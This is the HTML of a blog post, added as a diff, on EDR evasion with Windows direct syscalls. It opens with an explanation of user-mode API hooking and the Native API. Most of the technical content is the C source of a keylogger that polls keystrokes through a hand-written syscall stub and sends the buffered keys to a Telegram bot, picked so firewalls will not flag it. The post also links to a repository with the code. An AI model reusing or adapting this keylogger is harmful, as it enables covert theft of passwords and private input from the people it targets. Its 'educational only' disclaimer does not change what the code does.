@@ -1,0 +1,368 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  
+    <title>Syscalls — EDR evasion p1 (optional) :: Terminal</title>
+  
+  <meta http-equiv="content-type" content="text/html; charset=utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta name="description" content="What is User mode API-Hooking in EDR? Imagine you’ve just got some great deals at a newly opened supermarket and are heading home with your transparent shopping bag. As you stroll by the neighborhood grocer, he peeks into your bag to see what you’ve bought. If he spots something he already stocks (something sus), he stops you and won’t let you pass.
+User-mode API hooking allows EDRs to dynamically inspect code executed within the context of Windows APIs or Native APIs for potentially malicious content or behavior. There are various types of hooking, with most vendors using the inline hooking method. This method replaces a specific mov instruction—more specifically, the mov opcode and the eax SSN operands—with a 5-byte jmp instruction. The mov instruction typically moves the syscall number or system service number (SSN) to the eax register. The unconditional jmp instruction redirects to the EDR&rsquo;s hooking DLL, allowing the EDR to examine the code executed within the context of the Native API for potentially malicious content.
+" />
+<meta name="keywords" content="" />
+
+  <meta name="robots" content="noodp" />
+
+<link rel="canonical" href="https://c0rt3x.xyz/posts/syscalls-edr-evasion/" />
+
+
+
+
+
+  
+  <link rel="stylesheet" href="https://c0rt3x.xyz/css/buttons.min.86f6b4c106b6c6eb690ae5203d36b442c1f66f718ff4e8164fa86cf6c61ad641.css">
+
+  
+  <link rel="stylesheet" href="https://c0rt3x.xyz/css/code.min.4f0ccc8439f99bf7f7970298556b94011aabc1fcae743b6842fc3361a2da9ea3.css">
+
+  
+  <link rel="stylesheet" href="https://c0rt3x.xyz/css/fonts.min.5bb7ed13e1d00d8ff39ea84af26737007eb5051b157b86fc24487c94f3dc8bbe.css">
+
+  
+  <link rel="stylesheet" href="https://c0rt3x.xyz/css/footer.min.eb8dfc2c6a7eafa36cd3ba92d63e69e849e2200e0002a228d137f236b09ecd75.css">
+
+  
+  <link rel="stylesheet" href="https://c0rt3x.xyz/css/gist.min.a751e8b0abe1ba8bc53ced52a38b19d8950fe78ca29454ea8c2595cf26aad5c0.css">
+
+  
+  <link rel="stylesheet" href="https://c0rt3x.xyz/css/header.min.75c7eb0e2872d95ff48109c6647d0223a38db52e2561dd87966eb5fc7c6bdac6.css">
+
+  
+  <link rel="stylesheet" href="https://c0rt3x.xyz/css/main.min.15870410d15d02abd22fb5ef00996f65a00d04b3a7435e9f83831c7c2298de88.css">
+
+  
+  <link rel="stylesheet" href="https://c0rt3x.xyz/css/menu.min.3c17467ebeb3d38663dce68f71f519901124fa5cbb4519b2fb0667a21e9aca39.css">
+
+  
+  <link rel="stylesheet" href="https://c0rt3x.xyz/css/pagination.min.bbb986dbce00a5ce5aca0504b7925fc1c581992a4bf57f163e5d69cc1db7d836.css">
+
+  
+  <link rel="stylesheet" href="https://c0rt3x.xyz/css/post.min.e6dddd258e64c83e05cec0cd49c05216742d42fc8ecbfbe6b67083412b609bd3.css">
+
+  
+  <link rel="stylesheet" href="https://c0rt3x.xyz/css/syntax.min.a0773cce9310cb6d8ed23e50f005448facf29a53001b57e038828daa466b25c0.css">
+
+  
+  <link rel="stylesheet" href="https://c0rt3x.xyz/css/terminal.min.e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855.css">
+
+  
+  <link rel="stylesheet" href="https://c0rt3x.xyz/css/terms.min.b81791663c3790e738e571cdbf802312390d30e4b1d8dc9d814a5b5454d0ac11.css">
+
+
+<link rel="stylesheet" href="https://c0rt3x.xyz/terminal.css">
+
+
+
+
+<link rel="shortcut icon" href="https://c0rt3x.xyz/favicon.png">
+<link rel="apple-touch-icon" href="https://c0rt3x.xyz/apple-touch-icon.png">
+
+
+<meta name="twitter:card" content="summary" />
+
+
+
+<meta property="og:locale" content="en" />
+<meta property="og:type" content="article" />
+<meta property="og:title" content="Syscalls — EDR evasion p1 (optional)">
+<meta property="og:description" content="What is User mode API-Hooking in EDR? Imagine you’ve just got some great deals at a newly opened supermarket and are heading home with your transparent shopping bag. As you stroll by the neighborhood grocer, he peeks into your bag to see what you’ve bought. If he spots something he already stocks (something sus), he stops you and won’t let you pass.
+User-mode API hooking allows EDRs to dynamically inspect code executed within the context of Windows APIs or Native APIs for potentially malicious content or behavior. There are various types of hooking, with most vendors using the inline hooking method. This method replaces a specific mov instruction—more specifically, the mov opcode and the eax SSN operands—with a 5-byte jmp instruction. The mov instruction typically moves the syscall number or system service number (SSN) to the eax register. The unconditional jmp instruction redirects to the EDR&rsquo;s hooking DLL, allowing the EDR to examine the code executed within the context of the Native API for potentially malicious content.
+" />
+<meta property="og:url" content="https://c0rt3x.xyz/posts/syscalls-edr-evasion/" />
+<meta property="og:site_name" content="Terminal" />
+
+  <meta property="og:image" content="https://c0rt3x.xyz/og-image.png">
+
+<meta property="og:image:width" content="1200">
+<meta property="og:image:height" content="627">
+
+  <meta property="article:section" content="blog" />
+
+
+  <meta property="article:published_time" content="2024-07-31 00:00:00 &#43;0000 UTC" />
+
+
+
+
+
+
+
+
+
+
+
+
+</head>
+<body>
+
+
+<div class="container">
+
+  <header class="header">
+  <div class="header__inner">
+    <div class="header__logo">
+      <a href="/whoami">
+  <div class="logo">
+    Terminal
+  </div>
+</a>
+
+    </div>
+    
+      <ul class="menu menu--mobile">
+  <li class="menu__trigger">Menu&nbsp;▾</li>
+  <li>
+    <ul class="menu__dropdown">
+      
+        
+          <li><a href="/whoami">whoami</a></li>
+        
+      
+        
+          <li><a href="/posts">posts</a></li>
+        
+      
+        
+          <li><a href="/rants">rants</a></li>
+        
+      
+      
+    </ul>
+  </li>
+</ul>
+
+    
+    
+  </div>
+  
+    <nav class="navigation-menu">
+  <ul class="navigation-menu__inner menu--desktop">
+    
+      
+        
+          <li><a href="/whoami" >whoami</a></li>
+        
+      
+        
+          <li><a href="/posts" >posts</a></li>
+        
+      
+        
+          <li><a href="/rants" >rants</a></li>
+        
+      
+      
+    
+  </ul>
+</nav>
+
+  
+</header>
+
+
+  <div class="content">
+    
+<article class="post">
+  <h1 class="post-title">
+    <a href="https://c0rt3x.xyz/posts/syscalls-edr-evasion/">Syscalls — EDR evasion p1 (optional)</a>
+  </h1>
+  <div class="post-meta"><time class="post-date">2024-07-31</time></div>
+
+  
+    <span class="post-tags">
+      
+      #<a href="https://c0rt3x.xyz/tags/cybersecurity/">cybersecurity</a>&nbsp;
+      
+      #<a href="https://c0rt3x.xyz/tags/edr/">edr</a>&nbsp;
+      
+      #<a href="https://c0rt3x.xyz/tags/reverse-engineering/">reverse engineering</a>&nbsp;
+      
+      #<a href="https://c0rt3x.xyz/tags/malware/">malware</a>&nbsp;
+      
+      #<a href="https://c0rt3x.xyz/tags/windows-internals/">windows internals</a>&nbsp;
+      
+    </span>
+  
+  
+
+
+  
+
+  <div class="post-content"><div>
+        <h3 id="what-is-user-mode-api-hooking-in-edr">What is User mode API-Hooking in EDR?<a href="#what-is-user-mode-api-hooking-in-edr" class="hanchor" ariaLabel="Anchor">#</a> </h3>
+<p>Imagine you’ve just got some great deals at a newly opened supermarket and are heading home with your transparent shopping bag. As you stroll by the neighborhood grocer, he peeks into your bag to see what you’ve bought. If he spots something he already stocks (something sus), he stops you and won’t let you pass.</p>
+<p>User-mode API hooking allows EDRs to dynamically inspect code executed within the context of Windows APIs or Native APIs for potentially malicious content or behavior. There are various types of hooking, with most vendors using the inline hooking method. This method replaces a specific <code>mov</code> instruction—more specifically, the <code>mov</code> opcode and the <code>eax</code> SSN operands—with a 5-byte <code>jmp</code> instruction. The <code>mov</code> instruction typically moves the syscall number or system service number (SSN) to the <code>eax</code> register. The unconditional <code>jmp</code> instruction redirects to the EDR&rsquo;s hooking DLL, allowing the EDR to examine the code executed within the context of the Native API for potentially malicious content.</p>
+<h2 id="alt-text"><img src="/images/syscall1.webp" alt="Alt text"><a href="#alt-text" class="hanchor" ariaLabel="Anchor">#</a> </h2>
+<h3 id="what-is-windows-api">What is Windows API?<a href="#what-is-windows-api" class="hanchor" ariaLabel="Anchor">#</a> </h3>
+<p>Imagine you’re at a Turkish restaurant, and you’ve got a craving for lahmacun. Now, the Windows API is like the friendly waiter at this restaurant. When you want to order lahmacun (or any other dish), you don’t need to go into the kitchen yourself. You just tell the waiter what you want.</p>
+<p>So, you say, “I’d like to order lahmacun, please!” The waiter (Windows API) takes your order and communicates it to the kitchen (the operating system). The kitchen staff (kernel and hardware) then prepare your lahmacun just the way you like it.</p>
+<p>Let’s say you want your application to create a file. To do that, you need to use the documented Windows API function <code>CreateFileW</code> in your code. Implementing this is straightforward, thanks to Microsoft&rsquo;s documentation.</p>
+<p><img src="/images/syscall2.webp" alt="Alt text"></p>
+<p>To perform the save operation in the context of the user-mode process <code>notepad.exe</code>, the first step involves accessing <code>kernel32.dll</code> and calling the Windows API <code>WriteFile</code>. In the second step, <code>kernel32.dll</code> accesses <code>Kernelbase.dll</code>. In the third step, <code>WriteFile</code> accesses the Native API <code>NtCreateFile</code> through <code>ntdll.dll</code>.</p>
+<hr>
+<h3 id="what-is-native-api">What is Native API?<a href="#what-is-native-api" class="hanchor" ariaLabel="Anchor">#</a> </h3>
+<p>This time, instead of talking to the waiter, you ask to speak directly with the head chef. The head chef (Native API) knows all the secrets and special techniques for making lahmacun. This is like using the Native API: it gives you more control and access to features the regular waiter might not handle.</p>
+<p>The Native API is a set of undocumented functions provided by Windows, implemented in <code>ntdll.dll</code>, used internally by higher-level APIs to perform system operations.</p>
+<p><img src="/images/syscall3.webp" alt="Alt text"></p>
+<blockquote>
+<p>Some nerds have reverse-engineered these functions, allowing you to use undocumented NT functions in your code.</p></blockquote>
+<p>🔗 <a href="https://web.archive.org">NTAPI Undocumented Functions</a></p>
+<hr>
+<h3 id="direct-syscalls">Direct Syscalls<a href="#direct-syscalls" class="hanchor" ariaLabel="Anchor">#</a> </h3>
+<p>Now you’re feeling even more adventurous. You walk directly into the kitchen and tell the sous-chef how to cook it. This is like a direct syscall — you skip the APIs and go straight to the kernel.</p>
+<p>A direct syscall is a low-level way for programs to request services directly from the OS kernel, bypassing higher-level abstractions.</p>
+<hr>
+<h4 id="keylogger">Keylogger<a href="#keylogger" class="hanchor" ariaLabel="Anchor">#</a> </h4>
+<p>Example: A keylogger using Native API and syscalls, sending keystrokes to a Telegram bot.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="k">extern</span> <span class="n">SHORT</span> <span class="nf">NtUserGetAsyncKeyState</span><span class="p">(</span>
+</span></span><span class="line"><span class="cl">    <span class="n">IN</span> <span class="n">INT</span> <span class="n">vKey</span>
+</span></span><span class="line"><span class="cl"><span class="p">);</span>
+</span></span></code></pre></div><p>Syscall assembly stub:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="p">.</span><span class="n">code</span>
+</span></span><span class="line"><span class="cl"><span class="n">NtUserGetAsyncKeyState</span> <span class="n">PROC</span>
+</span></span><span class="line"><span class="cl">    <span class="n">mov</span> <span class="n">r10</span><span class="p">,</span> <span class="n">rcx</span>
+</span></span><span class="line"><span class="cl">    <span class="n">mov</span> <span class="n">eax</span><span class="p">,</span> <span class="mi">1044</span><span class="n">h</span>
+</span></span><span class="line"><span class="cl">    <span class="n">syscall</span>
+</span></span><span class="line"><span class="cl">    <span class="n">ret</span>
+</span></span><span class="line"><span class="cl"><span class="n">NtUserGetAsyncKeyState</span> <span class="n">ENDP</span>
+</span></span><span class="line"><span class="cl"><span class="n">end</span>
+</span></span></code></pre></div><p>To find the syscall SSN, debug the app and search for syscall instruction
+Or use: <a href="https://j00ru.vexillium.org/syscalls/win32k/64/">https://j00ru.vexillium.org/syscalls/win32k/64/</a></p>
+<p><img src="/images/syscall4.webp" alt="Alt text"></p>
+<p>Logging logic:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="kt">void</span> <span class="nf">appendToKeystrokes</span><span class="p">(</span><span class="kt">char</span> <span class="n">character</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="n">keystrokesSize</span> <span class="o">+</span> <span class="mi">1</span> <span class="o">&gt;=</span> <span class="n">BUFFER_SIZE</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="nf">sendToTgBot</span><span class="p">(</span><span class="n">keystrokes</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="n">keystrokesSize</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="n">keystrokes</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="sc">&#39;\0&#39;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="n">keystrokes</span><span class="p">[</span><span class="n">keystrokesSize</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="n">character</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="n">keystrokes</span><span class="p">[</span><span class="n">keystrokesSize</span><span class="p">]</span> <span class="o">=</span> <span class="sc">&#39;\0&#39;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="n">VOID</span> <span class="nf">KeyboardClicksLogger</span><span class="p">()</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="n">SHORT</span> <span class="n">state</span> <span class="o">=</span> <span class="nb">NULL</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="nf">LoadLibraryA</span><span class="p">(</span><span class="s">&#34;WIN32U.DLL&#34;</span><span class="p">)</span> <span class="o">==</span> <span class="nb">NULL</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;[!] LoadLibraryA Failed</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="k">return</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="k">while</span> <span class="p">(</span><span class="n">TRUE</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="nf">Sleep</span><span class="p">(</span><span class="mi">10</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="k">for</span> <span class="p">(</span><span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">33</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="mi">255</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">            <span class="n">state</span> <span class="o">=</span> <span class="p">(</span><span class="n">SHORT</span><span class="p">)</span><span class="nf">NtUserGetAsyncKeyState</span><span class="p">((</span><span class="n">DWORD</span><span class="p">)</span><span class="n">i</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">            <span class="k">if</span> <span class="p">(</span><span class="n">state</span> <span class="o">==</span> <span class="mi">1</span> <span class="o">||</span> <span class="n">state</span> <span class="o">==</span> <span class="o">-</span><span class="mi">32767</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">                <span class="k">if</span> <span class="p">((</span><span class="mi">7</span> <span class="o">&lt;</span> <span class="n">i</span><span class="p">)</span> <span class="o">&amp;&amp;</span> <span class="p">(</span><span class="mi">120</span> <span class="o">&lt;</span> <span class="n">i</span> <span class="o">||</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="mi">143</span><span class="p">))</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">                    <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;</span><span class="se">\\</span><span class="s">x%02X&#34;</span><span class="p">,</span> <span class="n">i</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">                    <span class="nf">appendToKeystrokes</span><span class="p">((</span><span class="kt">char</span><span class="p">)</span><span class="n">i</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">                <span class="p">}</span>
+</span></span><span class="line"><span class="cl">            <span class="p">}</span>
+</span></span><span class="line"><span class="cl">        <span class="p">}</span>
+</span></span><span class="line"><span class="cl">        <span class="n">state</span> <span class="o">=</span> <span class="p">(</span><span class="n">SHORT</span><span class="p">)</span><span class="nf">NtUserGetAsyncKeyState</span><span class="p">(</span><span class="n">VK_SPACE</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="p">(</span><span class="n">state</span> <span class="o">==</span> <span class="mi">1</span> <span class="o">||</span> <span class="n">state</span> <span class="o">==</span> <span class="o">-</span><span class="mi">32767</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">            <span class="nf">printf</span><span class="p">(</span><span class="s">&#34; &#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">            <span class="nf">appendToKeystrokes</span><span class="p">(</span><span class="sc">&#39; &#39;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="p">}</span>
+</span></span><span class="line"><span class="cl">        <span class="n">state</span> <span class="o">=</span> <span class="p">(</span><span class="n">SHORT</span><span class="p">)</span><span class="nf">NtUserGetAsyncKeyState</span><span class="p">(</span><span class="n">VK_RETURN</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="p">(</span><span class="n">state</span> <span class="o">==</span> <span class="mi">1</span> <span class="o">||</span> <span class="n">state</span> <span class="o">==</span> <span class="o">-</span><span class="mi">32767</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">            <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">            <span class="nf">appendToKeystrokes</span><span class="p">(</span><span class="sc">&#39;\n&#39;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="kt">int</span> <span class="nf">main</span><span class="p">()</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="n">HANDLE</span> <span class="n">hThread</span> <span class="o">=</span> <span class="nb">NULL</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="n">DWORD</span> <span class="n">dwThreadId</span> <span class="o">=</span> <span class="nb">NULL</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="n">keystrokes</span> <span class="o">=</span> <span class="p">(</span><span class="kt">char</span><span class="o">*</span><span class="p">)</span><span class="nf">malloc</span><span class="p">(</span><span class="n">BUFFER_SIZE</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="n">keystrokes</span> <span class="o">==</span> <span class="nb">NULL</span><span class="p">)</span> <span class="k">return</span> <span class="mi">1</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="n">keystrokes</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="sc">&#39;\0&#39;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="n">hThread</span> <span class="o">=</span> <span class="nf">CreateThread</span><span class="p">(</span><span class="nb">NULL</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="p">(</span><span class="n">LPTHREAD_START_ROUTINE</span><span class="p">)</span><span class="n">KeyboardClicksLogger</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">dwThreadId</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="n">hThread</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;[i] Thread %d Created</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="n">dwThreadId</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="nf">WaitForSingleObject</span><span class="p">(</span><span class="n">hThread</span><span class="p">,</span> <span class="n">INFINITE</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="n">keystrokes</span> <span class="o">!=</span> <span class="nb">NULL</span><span class="p">)</span> <span class="nf">free</span><span class="p">(</span><span class="n">keystrokes</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></div><p>Sending Logs?</p>
+<pre><code>Of course, we use Telegram — so it won’t be sussy for the firewall.
+</code></pre>
+<p>Let’s test the code and see if it works.
+<img src="/images/syscall5.webp" alt="Alt text">
+<img src="/images/syscall6.webp" alt="Alt text"></p>
+<p>🛡️ Does it evade EDR? Probably not. You need more advanced methods to fully bypass.
+🧠 This is educational only — don&rsquo;t use it to steal your friends’ passwords.</p>
+<p><img src="/images/syscall7.webp" alt="Alt text">
+🔗 GitHub: <a href="https://github.com/nol4ns3c/harach/blob/main/konsey-uyesi%20%28syscall%29">https://github.com/nol4ns3c/harach/blob/main/konsey-uyesi%20(syscall)</a></p>
+
+      </div></div>
+
+  
+    
+<div class="pagination">
+  <div class="pagination__title">
+    <span class="pagination__title-h">Read other posts</span>
+    <hr />
+  </div>
+  <div class="pagination__buttons">
+    
+    
+    
+      <a href="https://c0rt3x.xyz/posts/hunting-for-stealers/" class="button inline next">
+         [<span class="button__text">Hunting for Stealers</span>] &gt;
+      </a>
+    
+  </div>
+</div>
+
+
+  
+
+  
+    
+
+  
+</article>
+
+  </div>
+
+  
+    <footer class="footer">
+  <div class="footer__inner">
+    
+      <div class="copyright">
+        <span>© 2025 Powered by <a href="https://gohugo.io">Hugo</a></span>
+    
+      <span>:: <a href="https://github.com/panr/hugo-theme-terminal" target="_blank">Theme</a> made by <a href="https://github.com/panr" target="_blank">panr</a></span>
+      </div>
+  </div>
+</footer>
+
+
+
+
+
+
+<script type="text/javascript" src="/bundle.min.js"></script>
+
+
+
+
+
+  
+</div>
+
+</body>
+</html>
